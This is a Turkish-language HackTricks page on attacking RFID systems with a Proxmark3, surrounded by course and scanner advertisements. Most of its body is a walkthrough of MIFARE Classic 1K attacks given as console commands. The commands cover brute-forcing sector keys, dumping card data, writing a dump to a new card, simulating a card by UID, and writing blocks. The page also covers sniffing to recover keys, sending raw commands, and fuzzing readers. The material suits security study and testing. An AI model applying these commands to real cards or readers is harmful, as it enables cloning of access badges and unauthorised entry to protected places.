# Proxmark 3

<details>

<summary><strong>AWS hackleme hakkında sıfırdan kahramana kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) alın
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **göndererek paylaşın**.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli olan zayıflıkları bulun ve daha hızlı düzeltin. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Proxmark3 ile RFID Sistemlerine Saldırı

İlk yapmanız gereken şey bir [**Proxmark3**](https://proxmark.com) sahibi olmak ve [**yazılımı ve bağımlılıklarını yüklemek**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**i**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### MIFARE Classic 1KB'ı Saldırma

Bu, **16 sektöre** sahiptir, her biri **4 blok** içerir ve her blok **16B** içerir. UID, sektör 0 blok 0'da bulunur (ve değiştirilemez).\
Her sektöre erişmek için **2 anahtar** (**A** ve **B**) gereklidir ve bu anahtarlar her sektörün **3. bloğunda** (sektör trailer) saklanır. Sektör trailer ayrıca, 2 anahtar kullanarak **her bloğun okuma ve yazma** izinlerini veren **erişim bitlerini** saklar.\
İlkini bildiğinizde okuma izni vermek ve ikincisini bildiğinizde yazma izni vermek için 2 anahtar kullanışlıdır (örneğin).

Birkaç saldırı gerçekleştirilebilir
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3, hassas verileri bulmaya çalışmak için bir Etiket-Okuyucu iletişimini **dinlemek** gibi diğer işlemleri gerçekleştirmenizi sağlar. Bu kartta, **kriptografik işlemler zayıf olduğu için** iletişimi dinleyebilir ve kullanılan anahtarı hesaplayabilirsiniz (`mfkey64` aracıyla). 

### Ham Komutlar

IoT sistemleri bazen **markasız veya ticari olmayan etiketler** kullanır. Bu durumda, Proxmark3'ü özel **ham komutları etiketlere göndermek** için kullanabilirsiniz.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Bu bilgilerle kart hakkında bilgi arayabilir ve onunla iletişim kurma yöntemini araştırabilirsiniz. Proxmark3, `hf 14a raw -p -b 7 26` gibi ham komutlar göndermeyi sağlar.

### Komut Dosyaları

Proxmark3 yazılımı, basit görevleri gerçekleştirmek için kullanabileceğiniz önceden yüklenmiş bir **otomasyon komut dosyası** listesiyle birlikte gelir. Tam listeyi almak için `script list` komutunu kullanın. Ardından, `script run` komutunu kullanarak komut dosyasının adını yazın:
```
proxmark3> script run mfkeys
```
**Tag okuyucularını** fuzz etmek için bir betik oluşturabilirsiniz, böylece bir **geçerli kartın** verilerini kopyalayarak bir veya daha fazla rastgele **baytı rastgeleleştirir** ve herhangi bir tekrarlamada **okuyucunun çöküp çökmediğini** kontrol eder.

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli olan zayıflıkları bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm\_campaign=hacktricks&utm\_source=referral" %}


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını yapmak** ister misiniz? veya **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuz olan özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin.
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **göndererek paylaşın**.

</details>
